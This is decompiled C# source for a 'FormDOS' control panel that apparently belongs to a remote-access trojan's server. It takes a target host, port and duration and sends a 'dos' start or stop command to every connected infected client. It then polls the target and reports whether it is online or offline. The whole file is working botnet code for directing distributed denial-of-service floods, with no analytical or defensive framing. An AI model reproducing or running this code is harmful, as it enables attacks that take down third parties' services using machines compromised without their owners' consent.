using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000065 RID: 101
	public partial class FormDOS : Form
	{
		// Token: 0x06000219 RID: 537 RVA: 0x00017DB2 File Offset: 0x00015FB2
		public FormDOS()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600021A RID: 538 RVA: 0x00017DEC File Offset: 0x00015FEC
		private void BtnAttack_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text) || string.IsNullOrWhiteSpace(this.txtTimeout.Text))
			{
				return;
			}
			try
			{
				if (!this.txtHost.Text.ToLower().StartsWith("http://"))
				{
					this.txtHost.Text = "http://" + this.txtHost.Text;
				}
				new Uri(this.txtHost.Text);
			}
			catch
			{
				return;
			}
			if (this.PlguinClients.Count > 0)
			{
				try
				{
					this.btnAttack.Enabled = false;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "dos";
					msgPack.ForcePathObject("Option").AsString = "postStart";
					msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
					msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
					msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
					foreach (Clients clients in this.PlguinClients)
					{
						this.selectedClients.Add(clients);
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
					this.btnStop.Enabled = true;
					this.timespan = TimeSpan.FromSeconds((double)(Convert.ToInt32(this.txtTimeout.Text) * 60));
					this.stopwatch = new Stopwatch();
					this.stopwatch.Start();
					this.timer1.Start();
					this.timer2.Start();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600021B RID: 539 RVA: 0x00018020 File Offset: 0x00016220
		private void BtnStop_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "dos";
				msgPack.ForcePathObject("Option").AsString = "postStop";
				foreach (Clients @object in this.PlguinClients)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
				}
				this.selectedClients.Clear();
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
			catch
			{
			}
		}

		// Token: 0x0600021C RID: 540 RVA: 0x00018108 File Offset: 0x00016308
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("DOS ATTACK:{0}    Status:host {1}", this.timespan.Subtract(TimeSpan.FromSeconds((double)this.stopwatch.Elapsed.Seconds)), this.status);
			if (this.timespan < this.stopwatch.Elapsed)
			{
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
		}

		// Token: 0x0600021D RID: 541 RVA: 0x000181A8 File Offset: 0x000163A8
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
				this.status = "is online";
			}
			catch
			{
				this.status = "is offline";
			}
		}

		// Token: 0x0600021E RID: 542 RVA: 0x00018200 File Offset: 0x00016400
		private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				foreach (Clients clients in this.PlguinClients)
				{
					clients.Disconnected();
				}
				this.PlguinClients.Clear();
				this.selectedClients.Clear();
			}
			catch
			{
			}
			base.Hide();
			base.Parent = null;
			e.Cancel = true;
		}

		// Token: 0x040001C8 RID: 456
		private TimeSpan timespan;

		// Token: 0x040001C9 RID: 457
		private Stopwatch stopwatch;

		// Token: 0x040001CA RID: 458
		private string status = "is online";

		// Token: 0x040001CB RID: 459
		public object sync = new object();

		// Token: 0x040001CC RID: 460
		public List<Clients> selectedClients = new List<Clients>();

		// Token: 0x040001CD RID: 461
		public List<Clients> PlguinClients = new List<Clients>();
	}
}
